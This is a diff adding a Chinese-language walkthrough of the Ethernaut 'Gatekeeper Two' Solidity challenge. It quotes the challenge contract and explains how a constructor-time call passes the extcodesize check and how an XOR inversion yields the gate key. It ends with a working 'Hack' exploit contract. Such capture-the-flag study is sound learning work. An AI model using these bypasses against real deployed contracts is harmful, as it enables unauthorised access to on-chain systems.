@@ -1011,3 +1011,88 @@ contract Hack {
 
 - [Solidity variables — storage, type conversions and accessing private variables](https://medium.com/coinmonks/solidity-variables-storage-type-conversions-and-accessing-private-variables-c59b4484c183)
 - [solidity - Why does Remix's jsVM show incorrect gas? - Ethereum Stack Exchange](https://ethereum.stackexchange.com/questions/84670/why-does-remixs-jsvm-show-incorrect-gas)
+
+## 14. Gatekeeper Two
+
+通过新的挑战！
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract GatekeeperTwo {
+
+  address public entrant;
+
+  modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+  }
+
+  modifier gateTwo() {
+    uint x;
+    assembly { x := extcodesize(caller()) } // 内联汇编
+    // caller() - call sender (excluding delegatecall)
+    // extcodesize(a) - size of the code at address a
+    require(x == 0);
+    _;
+  }
+
+  modifier gateThree(bytes8 _gateKey) {
+    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
+    _;
+  }
+
+  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    entrant = tx.origin;
+    return true;
+  }
+}
+```
+
+- `gateTwo` 需要调用合约的代码长度为 0，与解题矛盾。[ETHEREUM: A SECURE DECENTRALISED GENERALISED TRANSACTION LEDGER](https://ethereum.github.io/yellowpaper/paper.pdf) 中提到，在代码初始化时，对应地址的 `EXTCODESIZE` 应返回 0，那么只需要在构造函数里调用 `enter` 就可以了
+- 至于 `gateThree`，使用异或逆运算求解就好啦
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract GatekeeperTwo {
+
+  address public entrant;
+
+  modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+  }
+
+  modifier gateTwo() {
+    uint x;
+    assembly { x := extcodesize(caller()) }
+    require(x == 0);
+    _;
+  }
+
+  modifier gateThree(bytes8 _gateKey) {
+    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
+    _;
+  }
+
+  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    entrant = tx.origin;
+    return true;
+  }
+}
+
+contract Hack {
+
+  constructor(address instance) public {
+    GatekeeperTwo gk = GatekeeperTwo(instance);
+    gk.enter(bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)));
+  }
+}
+```
+
+### 参考资料
+
+[Inline Assembly](https://docs.soliditylang.org/en/v0.6.0/assembly.html#inline-assembly)
